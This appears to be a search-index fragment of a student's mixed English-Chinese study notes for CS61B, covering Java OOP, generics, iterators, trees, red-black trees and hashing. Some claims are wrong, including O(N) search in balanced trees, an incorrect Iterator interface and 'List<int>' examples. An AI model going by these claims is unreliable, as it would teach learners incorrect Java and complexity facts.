sentinel;\n    private int size;\n\n    public class IntNode {\n        public IntNode prev;\n        public myTypeName item;\n        public IntNode next;\n        ...\n    }\n    ...\n}\n</code></pre> <p>Warning: If this IntNode is declared as \"static\", it can't use generics type name \"myTypeName\"</p> <p>How to use the generics</p> <pre><code>DLList&lt;String&gt; d1=new DLList&lt;&gt;(\"hello\");  //in the second \"&lt;&gt;\" we don't need to write the typename\n</code></pre> <p>Important!</p> <p>The generics grammar is only work with reference type so that we can't use primitive type like \"int\" or \"double\" in it. So, we have some reference type to replace them like Integer and so on.</p> <pre><code>DLList&lt;Integer&gt; d2=new DLList&lt;&gt;(2);\nDLList&lt;int&gt; d3=new DLList&lt;&gt;(2);//error\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#package","title":"package","text":"<p>this part is not completed yet</p> <p>what is package</p> <p>Package is a collection of java classes and work for the common goal.</p> <p>For example, org.junit is a package for test code. \"Assert\" is a class in it which contains function like assertEqual</p> <p>how to make a package</p> <p>We should use keyword \"package\" in the top of the file to show that this file is belonging to the package</p> <pre><code>package deque; //\u8fd9\u8868\u793a\u8be5\u6587\u4ef6\u91cc\u7684\u5185\u5bb9\u662fdeque\u8fd9\u4e2apackage\u7684\u4e00\u90e8\u5206\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#throw-exception","title":"throw exception","text":"<p>Here is an example of throwing exception in Java</p> <pre><code>public void add(T value){\n    if(value==null){\n        throw new IllegalArgumentException(\"can't add null\");\n    }\n    ....\n}\n</code></pre> <p>The exception is used to provide the error message and control to stop the flow of program instead of making the crash.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/","title":"oop","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#object-oriented-programming-in-java","title":"object oriented programming in java","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#interface-inheritance","title":"interface inheritance","text":"<p>There is hierarchy(\u7b49\u7ea7\u5dee\u5f02) between class and class.</p> <p>For example, SLList and AList are two type of List with different data organizing way. They are hyponyms of List and List is hypernyms of them. We also called this relationship as subclass and superclass.</p> <p>In java, the superclass is used to provide interface, and the subclass to provide implementation. Here is an example</p> <pre><code>public interface List&lt;Item&gt;{...}\npublic AList&lt;Item&gt; implements List&lt;Item&gt; {...}\n//this implements is a promise that we will cover all\n//attributes and behaviors in the List&lt;Item&gt;\n</code></pre> <p>Inheritance and the function overriding, we solve many problems of function overload. We don't need to give each subclass a overloaded function.</p> <p>Note: \u200bwe don't need to write the \"public\" or \"private\" in interface.</p> <p>overriding</p> <p>When we are implementing these functions, we'd better note here @override</p> <pre><code>@Override\npublic void addFirst(Item x){\n    insert(x,0);\n}\n</code></pre> <p>Inheritance can be multi-generational. One superclass may also is subclass of another class.</p> <p>default</p> <p>Sometime, we don't want the superclass only contians the interface, we hope it can complete some implementations.</p> <pre><code>public interface List&lt;Item&gt;{\n    ...\n    default public void print(){\n            for(int i=0;i&lt;size();i++){\n                System.out.print(get(i)+\" \");\n            }\n            System.out.println();\n    }\n}\n</code></pre> <p>For every subclass of List, if they don't make differenet implementations of this this interface. We will use this function. <p>For SLList, this default function is obviously an awful solution, so it can make its own implementation, and system will use its method instead of default one.</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#upcast-and-compile-time-type-check","title":"upcast and compile time type check","text":"<p>We have talked about the rule of equals(a=b) in java, which is the copy the bits from b to a.</p> <p>Now, we refer to the superclass and subclass. Like below</p> <pre><code>public interface List&lt;Item&gt;{...}\npublic AList&lt;Item&gt; implements List&lt;Item&gt; {...}\n...\npublic static void func(List&lt;int&gt; list);\n...\nAlist&lt;int&gt; list;\nfunc(list);  //what happened in the argument passing\n</code></pre> <p>Or we just use a more simple example</p> <pre><code>List&lt;Integer&gt; somelist=new AList&lt;Integer&gt;();\n</code></pre> <p>While compiling, system will check  \"is-a\" relationship. In the example above, the AList is a List, so this sentence is right. However, if we swap their positions, List isn't an AList, and it will occur mistake.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#dynamic-method-selection","title":"dynamic method selection","text":"<p>We still talk about the example below</p> <pre><code>List&lt;int&gt; list=new AList&lt;&gt;();\n</code></pre> <p>List is the static type list, we know all of reference type variables in java is pointer. As a pointer, list's type is List <p>Besides, we actually create a AList object, and list points at an AList object. So AList is list's dynamic type. <p>The dynamic type of the object can be changed, it can turned from AList to SLList. When program runs the overidden method, it will find the appropriate method in the dynamic type.</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#overload-of-inheritance","title":"overload of inheritance","text":"<p>We have known that Java select the overloaded functions by type of parameter we give.</p> <p>In fact, it will check the static type \u200binstead of dynamic type. Here we give an example</p> <pre><code>//overloaded function\npublic static void func(List&lt;Integer&gt; list);\npublic static void func(SLList&lt;Integer&gt; list);\n...\n//in the main function\nSLList&lt;Integer&gt; a=new SLList&lt;&gt;(); //static type is SLList and dynamic type is SLList too\nList&lt;Interger&gt; b=a;               //static type is List and dynamic type is SLList\nfunc(a);                          //use the second one\nfunc(b);                          //use the first one\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#extends-and-implement","title":"extends and implement","text":"<p>We have discussed the implementation relationship, which asks the subclass should implement all of methods the superclass provides.</p> <p>However, sometimes we want to add more methods in the subclass, and in this situation we will use the keyword extends .</p> <pre><code>public class RotatingSLList&lt;Item&gt; extends SLList&lt;Item&gt; {...}\n</code></pre> <p>In this example above, RotatingSLList will inherit all methods the SLList has and can make modifications or add some methods.</p> <p>And we need to know what exactly do we inherit by extending.</p> <ol> <li>All instances and static variables</li> <li>All methods</li> <li>All nested class</li> </ol> <p>But we should notice that the constructor isn't inherited and we can't access the private members directly \u200bin subclass.</p> <p>The situation of constructor is a little special. For ensuring \"is-a\" relationship, we promise that we need to use the superclass's constructor at first in the subclass's constructor. For example</p> <pre><code>public class VengefulSLList&lt;Item&gt; extends SLList&lt;Item&gt;{\n    SLList&lt;Item&gt; deletedItems;\n    ...\n    public VengefulSLList(){\n        super();\n        deletedItems = new SLList&lt;Item&gt;();\n    }\n    ...\n}\n</code></pre> <p>This \"super()\" is explicitly using the constructor of  superclass, if we don't use it, the Java will automatically call the superclass's non-argument constructor for us. If we need to pass some arguments to the superclass's constructor, it must be use explicitly.</p> <p>Note: you can implement multiple interface like that <code>public class ArrayDeque&lt;T&gt; implements Deque&lt;T&gt;,Iteratable&lt;T&gt;</code>\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#the-object-class","title":"the object class","text":"<p>Every class in Java is descendant of Object class, or extends the Object class.</p> <p>They may don't explicitly express the relationship with Object but they actually do it.</p> <p>So, we want to know what we actually inherit from the Object class.</p> <p>Object method</p> <pre><code>String toString();\nboolean equals(Object obj);\n</code></pre> <p>toString()</p> <p>The default method of toString() is to print the location of the object in memory. For most of class we define by ourselves, we should  write our own toString() function to make the print result readable.</p> <p>We note that the method <code>System.out.print()</code>\u200b will call the toString() method for all of argument and print the string.</p> <pre><code>// the true situation\nString s=myobject.toString();\nSystem.out.print(s);\n</code></pre> <p>I will implement the toString() method in my ArreySet.java class. You can find this file in the JavaTest file.</p> <p>equals()</p> <p>We already have the \"A==B\" in Java and it will compare each bit in A and B. For the primitive variable it will compare their value and for the reference variable it will compare their address.</p> <pre><code>public class test{\n    private int a;\n    private int b;\n    public test(int a,int b){...}\n    ...\n}\n...\n//main \ntest A=test(1,2);\ntest B=test(1,2);\n//However, A==B is false\n</code></pre> <p>For reference type variable, \"==\" means they point at the same object rather the objects have the same content. So we need to have equals() method.</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#static-type-and-dynamic-type","title":"static type and dynamic type","text":"<p>****This part note is not organized well, I will rewrite it after.</p> <p>When we call the method, we will turn to dynamic type. It is what we have discussed before. However, static type will also make the difference.</p> <p>In fact, a object, whose static type is superclass and dyanmic type is subclass which make extends, it can't call the method its dynamic type added.</p> <p>And when we don't call the method, the object always express as its static type.</p> <p>All in all, static type is its type and decide what the object can do, meanwhile the dynamic type decide what the object actually do.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#higher-order-function","title":"higher order function","text":"<p>How to create a function variable.</p> <p>We can create the interface to make it possible. (\u7c7b\u4f3c\u4e8ecpp\u7684\u4eff\u51fd\u6570\uff09</p> <pre><code>//\u5b9a\u4e49\npublic interface IntUnaryFunction {\n    int apply(int x);\n}\n//\u5b9e\u73b0\npublic class TenX implements IntUnaryFunction {\n    /* Returns ten times the argument. */\n    public int apply(int x) {\n        return 10 * x;\n    }\n}\n//\u51fd\u6570\u4f7f\u7528\npublic static int do_twice(IntUnaryFunction f, int x) {\n    return f.apply(f.apply(x));\n}\n//\u5b9e\u9645\u8c03\u7528\nSystem.out.println(do_twice(new TenX(), 2));\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#polymorphism","title":"polymorphism","text":"<p>The main idea of polymorphism is \"many methods\". And polymorphism express that an object can be an instance of its own class, its superclass and its superclass's superclass...</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/oop/#javas-alternative-for-operator-overloading","title":"Java's alternative for operator overloading","text":"<p>introduction</p> <p>In cpp, we can write one function to find the max element in an array easily, as long as the elements in the array have operator overload about the '&gt;', '&lt;' and '=='. Luckily, for most of the class that is comparable, coders will provide the operator overloading functions. This one function can cover most of situations.</p> <p>However, in Java, we can't make operator overloading, so things will become a little complex.</p> <p>At first, we want to write a compare function in each class to replace the ability of operator overloading, but it means all of class should coincidentally use the same compare function name. So the good way is to write an interface and let each class to implement it.</p> <pre><code>public interface ourComparable{\n    public int compareTo(Object o);\n} \n</code></pre> <p>All class that is comparable should implement this interface, and provide the compareTo function.</p> <p>Comparable</p> <p>In fact, Java has already provided a similar interface for us and it has been used in countless Java library</p> <pre><code>public interface Comparable&lt;T&gt;{\n    public int compareTo(T obj);\n}\n...\n//an example to implement the generic interface\npublic class Dog implements Comparable&lt;Dog&gt;{\n    ...\n    public int compareTo(Dog anoDog){\n        ...\n    }\n}\n</code></pre> <p>In this real, built-in interface, we find it uses generic and it can avoid some awful cast from Object to each class.</p> <p>Comparator</p> <p>Sometimes, an object may have many dimensions to compare, but it can only have one compareTo function if we only use the Comparable interface. So Java also offers us another interface.</p> <pre><code>public interface Comparator&lt;T&gt;{\n    public int compare(T o1,T o2);\n}\n</code></pre> <p>The usual way to use the comparator is different from the comparable, we will create a static nested class in the class we want to make compare.</p> <pre><code>public class Dog implements Comparable&lt;Dog&gt;{\n    ...\n    private static class NameCompare implements Comparator&lt;Dog&gt;{\n        public int compare(Dog dog1,Dog dog2){\n                return dog1.name.compareTo(dog2.name);\n        }\n    }\n    ...\n}\n</code></pre> <p>We note that the nested class is private here, which means it can't be instanced outside.</p> <pre><code>// \u5728\u5176\u4ed6\u7684\u7c7b\u4e2d\nNameCompare a=new Dog().new NameCompare(); // warning it isn't allowed\n</code></pre> <p>So, in Java's generic programming we should avoid using &gt; &lt; = and we should use the compareTo() equals() method.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/preparation%20for%20the%20lesson/","title":"preparation for the lesson","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/preparation%20for%20the%20lesson/#computer-environment-setup","title":"computer environment setup","text":"<p>\u5b66\u4e60CS61B\u9700\u8981\u7684\u7535\u8111\u914d\u7f6e \u4ee5Windows\u4e3a\u4f8b</p> <ol> <li>Java\u73af\u5883 JDK \u6211\u76ee\u524d\u4f7f\u7528\u7684\u662fJDK20 </li> <li>git git bash\u662f\u65b9\u4fbf\u7684shell\u53ef\u4ee5\u6267\u884clinux\u547d\u4ee4\uff0c\u65b9\u4fbf\u7ba1\u7406\u4ee3\u7801\u7248\u672c </li> <li>intellij IDEA \u9002\u5b9cJava \u8f83\u91cd\u578b\u7684IDE </li> <li>\u7ffb\u5899 \u6d4f\u89c8\u8bfe\u7a0b\u7f51\u7ad9\u548c\u4ee3\u7801\u63d0\u4ea4 </li> <li>GitHub\u8d26\u53f7 \u83b7\u53d6\u521d\u59cb\u4ee3\u7801\u548c\u63d0\u4ea4\u4f5c\u4e1a</li> </ol> <p>\u8fd9\u4e9b\u90fd\u4e0d\u662f\u4e0a\u8bfe\u524d\u9700\u8981\u6211\u4eec\u51c6\u5907\u597d\u7684\uff0c\u8bfe\u7a0b\u4e2d\u6709\u76f8\u5f53\u7fd4\u5b9e\u7684\u8d44\u6599\u5e2e\u52a9\u6211\u4eec\u51c6\u5907\u4e0a\u8ff0\u914d\u7f6e\uff08\u9664\u4e86\u7ffb\u5899\uff09</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/","title":"data structure","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#adt","title":"ADT","text":"<p>ADT, abstaction date structure, is defined by its operations, not by its implementations</p> <p>Java separates the interface from implementation, which could better carry the concept of ADT.</p> <p>In java.util library, many important interfaces like List Set Map all extend **Collection ** interface.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#iteration","title":"iteration","text":"<p>introduction:</p> <p>We can make the loop for the elements in the Java's built-in HashSet, like below</p> <pre><code>Set&lt;String&gt; cities=new HashSet&lt;&gt;();\ncities.add(\"BeiJing\");      cities.add(\"HangZhou\");\nfor(String city: cities){\n    System.out.println(city);\n}\n</code></pre> <p>However, the data structure we usual define may not support this way of loop.</p> <p>So what happens in the </p> <pre><code>for(String city: cities)\n</code></pre> <p>In fact, it will be translated to this form of loop.</p> <pre><code>//seer.hahNext() is to check whether there is unseen elements left, if it returns true means it still have element left\n//seer.next() finish two actions: return the next element and advances the seer by one item\nfor(Iterator&lt;String&gt; seer=cities.iterator();seer.hasNext()==true;){\n    String city=seer.next();\n    ...\n}\n</code></pre> <p>the key of this loop is the object called iterator. </p> <p>here we talk about how to implement the iterator</p> <p>A good way to learn iterator is to understand the Java's built-in iterator interface.</p> <pre><code>public interface Iterator&lt;T&gt;{\n    Iterator&lt;T&gt; iterator();\n    boolean hashNext();\n    T next();\n}\n// we notice that we don't define public and private in the interface\n</code></pre> <p>Note that if we call the next() method while there is no element remains, it will usually throw exception message.</p> <p>In most cases, the classes want to be iterable will implement their own Iteration.</p> <pre><code>private class ArraySetIterator implements Iterator&lt;T&gt;{\n    private int wizPos;\n    public Iterator&lt;T&gt; iterator(){return new ArraySetIterator;}\n    public boolean hasNext(){\n        return wizPos&lt;size;\n    }\n    public T next(){\n        T returnItem = items[wizPos];\n        wizPos += 1;\n        return returnItem;\n    }\n}\n</code></pre> <p>And the iterator should implement the Iterator while its container ArraySet should implement the Iterable.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#list","title":"List","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#linklist-in-java","title":"linklist in java","text":"<p>At first, we design a simple IntList class, which we can refer to LinkList floder \"the first Intlist version\" in git. It's function is enough as a linklist but it's application is awful.</p> <p>We can find the final version of SLList in the LinkList floder and refer to the git version, which marked with \"this version for SLList is almost perfect\"</p> <p>Because the LinkList is already familar. So our note will begin with the doubly linked list</p> <p>doubly linked list</p> <pre><code>public class IntNode {\n    public IntNode prev;\n    public int item;\n    public IntNode next;\n}\n</code></pre> <p>Above is our IntNode class in this data structure</p> <p>As we have two pointer here, so we can have two sentinel node to avoid some problems. Or we can use one sentinel node and create a circle</p> <p>to break type limitation</p> <p>refer to java learning--generics</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#array","title":"Array","text":"<p>Array consists of a fixed length N and a sequence of N memory boxes, which is continuous(?).</p> <p>Unlike the class we design, array don't have methods.</p> <p>How to create array</p> <pre><code>int[] x = new int[3]; //\u8fd9\u79cd\u5904\u7406\u65b9\u5f0f\u4f1a\u7ed9x\u7684\u4e09\u4e2a\u5143\u7d20\u4e00\u4e2adefault value \u4e00\u822c\u662f0\nint[] y = new int[]{1, 2, 3, 4, 5};\nint[] z = {9, 10, 11, 12, 13}; //\u8fd9\u79cd\u5904\u7406\u65b9\u6cd5\u53ea\u80fd\u5728\u58f0\u660e\u65f6\u4f7f\u7528\n//\u53ea\u6709\u8fd9\u4e09\u79cd\u65b9\u5f0f\n</code></pre> <p>Multidimension array</p> <pre><code>//\u521d\u59cb\u5316\u7684\u65f6\u5019\u53ef\u4ee5\u4e0d\u786e\u5b9a\u5b50\u6570\u7ec4\u7684\u5927\u5c0f\nint[][] pascalTriangle=new int[4][];\npascalTriangle[0]=new int[]{1};\npascalTriangle[1]=new int[]{1,2};\n\n//\u4e5f\u53ef\u4ee5\u9009\u62e9\u521d\u59cb\u5316\u5b50\u6570\u7ec4\u7684\u5927\u5c0f\nint[][] matrix=new int[4][4];\n\n//\u521d\u59cb\u5316\u7684\u65f6\u5019\u5c31\u786e\u5b9a\u6570\u7ec4\u5185\u5bb9\nint[][] anomatrix=new int[][]{{1,2,3,4},{1,2,3,4},{1,2,3,4},{1,2,3,4}};\n</code></pre> <p>Array is different from class, it uses \"[]\" to access memory while class uses \".\"</p> <p>Here is a special example</p> <pre><code>int indexOfInterest = askUserForInteger();\nint[] x = {100, 101, 102, 103};\nint k = x[indexOfInterest];\nSystem.out.println(k);\n//\u5f53\u6211\u4eec\u8fd0\u884c\u8be5\u7a0b\u5e8f\u7684\u65f6\u5019\u5b83\u4f1a\u8be2\u95ee\u4f60\u9700\u8981\u7684\u4e0b\u6807\uff0c\u7136\u540e\u663e\u793a\u51fa\u7ed3\u679c\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#alist","title":"AList","text":"<p>Array in java doesn't meet the requirement as an abstract data structure. The most obvious part is that it has fixed length, while the List we need shouldn't have length limits.</p> <p>So we need to design a class based on Array and expands its method.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#stack-and-queue","title":"stack and queue","text":"<p>Stack and List are all ADTs, which is defined by their methods not their implementation. But here are some ADT like stack and queue are lists with their specific behavior.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#deque","title":"deque","text":"<p>Deque is an ADT and we implement the two kind of deque in the project 2. They are ArrayDeque and LinkedListDeque. We also create an MaxArrayDeque to extends the methods of these two implementation.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#disjoint-set","title":"disjoint set","text":"<p>Disjoint set is a dats structure with these two operations</p> <pre><code>void connect(x,y)       //\u8fde\u63a5x\u548cy\nboolean isConnected(x,y)//\u68c0\u67e5x\u548cy\u662f\u5426\u8fde\u63a5\uff0c\u8fde\u63a5\u53ef\u4ee5\u4f20\u9012\n</code></pre> <p>The purpose is simple but the importance is how to implement it. In the 61B, the slides give many different ways to complete this task, and we find some features of this data structure. (I will complete some of them in the javatest/disjointset/ )</p> <ol> <li>we don't add elements just create connections</li> <li>we don't make disconnecting action so we don't know how do two elements connecct.</li> </ol> <p>The tree structure to store each set is a good way to advance the connecting and checking. Because the whole number of elements won't change, we can use the array to imitate the tree. If two elements have the same root, they are connected.</p> <p>In this implementation, the important part is to loose the weight of tree. If we complete it well, the time complexity will be O(logN) </p> <p>There still is an idea to make it quicker, when we check \"isConnected\", we will traverse all elements from one element to its root, we can connect these elements along the way with the root directlt while traversing</p> <pre><code>//implement the isConnected\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#tree","title":"tree","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#the-definition-of-tree","title":"the definition of tree","text":"<p>Tree maybe the most important data structure we have learnt.</p> <p>For the detailed the definition of the tree, I have talked about it in the ZJU-fds note and I will not repeat here.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#basic-binary-tree","title":"basic binary tree","text":"<p>Binary tree is one of the most important special trees, and it has the feature that each node has 0, 1 or 2 children.</p> <p>And the binary search tree is one of the applications of the binary tree, with the property that for each node, each key in left sub-tree is less than this node and each key in the right sub tree is larger than it.</p> <pre><code>private class BST&lt;Key&gt; {\n    private Key key;\n    private BST left;\n    private BST right;\n\n    public BST(Key key, BST left, BST Right) {\n        this.key = key;\n        this.left = left;\n        this.right = right;\n    }\n\n    public BST(Key key) {\n        this.key = key;\n    }\n}\n</code></pre> <p>For the binary search tree, we also need the find method and the insert method.</p> <pre><code>static BST find(BST T, Key sk) {\n   if (T == null)\n      return null;\n   if (sk.equals(T.key))\n      return T;\n   else if (sk \u227a T.key)\n      return find(T.left, sk);\n   else\n      return find(T.right, sk);\n}\nstatic BST insert(BST T, Key ik) {\n  if (T == null)\n    return new BST(ik);\n  if (ik \u227a T.key)\n    T.left = insert(T.left, ik);\n  else if (ik \u227b T.key)\n    T.right = insert(T.right, ik);\n  return T;\n}\n</code></pre> <p>Note:  we find that we always insert a leave node in the insert method.</p> <p>Besides, we also have delete method should be implement but it is a little of complex.</p> <ul> <li>For node with one child and no child is easy to delete.</li> <li>For the node with two children, we need to find the the least node in right sub-tree or the biggest node in the left sub-tree, and replace it with the node you want to delete.</li> </ul> <p>Binary search tree can be the implementation of the ADT set and map with high efficiency. But this efficiecny is highly related to the structure of the tree.</p> <p>We have the height and the average depth to deterimine the worst run-time and the average run-time. And the order you insert the node determine the height of the tree.</p> <p>For the balanced search tree, the time complexity of search is always O(N).</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#b-tree","title":"B-tree","text":"<p>It can contain three elements in each node and its means it will have at most four children at the same time. (this kind of b-tree has L=3, means each node has the maximum number of element with 3)</p> <p>\u200b\u200b</p> <p>Each time we add an element we add it to leaves inside and the size of leaf is overflow we add the element to the parent node until the root is overflowed the height of the tree adds.</p> <p>\u200b</p> <p>It is a good way to keep the balance of the tree. No matter how we insert the element, B-tree can keep the O(logN) efficiency.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#the-rotating-tree","title":"the rotating tree","text":"<p>B-tree is great but it is hard to implement, so we don't mention the code in the last chapter.</p> <p>However, here are still many ways for us to keep balance tree, like tree rotation.</p> <p>So we need to know what happened when tree make rotation.</p> <pre><code>private Node rotateRight(Node h) {\n    // assert (h != null) &amp;&amp; isRed(h.left);\n    Node x = h.left;\n    h.left = x.right;\n    x.right = h;\n    return x;\n}\n\n// make a right-leaning link lean to the left\nprivate Node rotateLeft(Node h) {\n    // assert (h != null) &amp;&amp; isRed(h.right);\n    Node x = h.right;\n    h.right = x.left;\n    x.left = h;\n    return x;\n}\n</code></pre> <p>Here we give an example of the rotation</p> <p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#red-black-tree","title":"red-black tree","text":"<p>We want to create a BST and it can be structurally identical to 2-3 tree(not 2-3-4 tree), so it is easy to implement and stays balance.</p> <p>We know that 2-3 tree is not the binary tree and we can design some rules to make 1-1 correspondence between one kind of binary tree and 2-3 tree, which kind of binary tree we called red-black tree.</p> <p>We choose arbitrarily to make the left element a child of the right one. This results in a left-leaning tree. The link we glue we make it red.</p> <p>\u200b</p> <p>And the left-leaning red-black tree has the features below</p> <ul> <li>1-1 correspondence with 2-3 trees.</li> <li>No node has 2 red links.</li> <li>There are no red right-links.</li> <li>Every path from root to leaf has same number of black links (because 2-3 trees have same number of links to every leaf).</li> <li>Height is no more than 2x height of corresponding 2-3 tree.</li> </ul> <p>So as the BST with the balance structure, we don't worry about its find method, we can do it like the normal BST. What we really care is the insert method.</p> <p>We should avoid creating the 2-3 tree but we need to keep balance, we should insert element using the BST's method and using the rotation to keep it balance. This is a little complex problem.</p> <ol> <li>insert color In 2-3 tree, we always add items in red link</li> <li>insert to the right Of course we will add a right red-link here, but we don't have right red-link in LLRB so we will make rotation. make the left-rotation to the parent node.</li> <li>**double insert to left **  we will create a temporary node with two red links.</li> <li>**splitting the node ** the situation in 3 is temporary and we need to split the node. And here we don't need to make any rotation we just make the two red links black and their parent link red.</li> </ol> <p>The implementation of the red-black tree can refer to the CS61B sp-21 lab7( **note ** that the delete operation may break the balance.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#hash","title":"hash","text":"<p>We have make a lot of effort to achieve a quick search. And the best one the red-black tree. But it has limits, for example the elements in it should be comparable and the search speed is O(logN).</p> <p>Then we have hash. We can assume that we have a big array, and we have a function can turn every object into an \"int\". So we can find the object in O(1), by <code>array[object.toInt];</code>\u200b </p> <p>We called this \"int\" as \"hashcode\". When we create a rule to make the hash, the collision is inevitable. So our position in the array should contain more than one element. For example, we can create a linked list in each position.</p> <p>Because our array has limited size, if the size is fixed and the number of elements grows, the time complexity of searching will become the O(N), that's bad.</p> <p>resize the array</p> <p>If the number of elements(M) grows too large, we can resize the array size(N), to keep the M/N is constant number, so the search efficiency will keep O(1).</p> <p>Besides the resize task, we also need to have a good hash function to make the hash map working quickly.</p> <p>implementation in Java</p> <p>All of object in Java implements the function <code>hashCode()</code>\u200b which is inheriting from the Object class.</p> <p>Note:</p> <ul> <li>the hasCode return a integer, which has limited range in Java</li> <li>the hasCode can be negative. But we don't have negative array subscript in Java. So we should use a Math function.   \u200b<code>Math.floorMod(-1,4)</code>\u200b which will be 3 (we assume that 4 is the size of array)</li> </ul> <pre><code>array[Math.floorMod(object.hashCode(), array.size())] = true;\n</code></pre> <p>If you want to use the hashMap and hashSet in Java correctly, you should note that</p> <ul> <li>don't change the element the object in hashMap or set. When it changes, so does its hashCode</li> <li>you should overrides the equals() method and hashCode() method together</li> </ul> <p>a good hash function</p> <p>Now we have almost solve the problem of hash, But there still is one leave. How to write a good hash function.</p> <p>A good hash function should be random.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#priority-queue-heaps","title":"priority queue (heaps)","text":"<p>Refer to ZJU-fds</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/data%20structure/data%20structure/#graph","title":"graph","text":"<p>In trees we can only find one path between two nodes. And we can break this rules in graph.</p> <p>A graph contains</p> <ul> <li>a set of nodes</li> <li>a set of edges( can be 0 )</li> </ul> 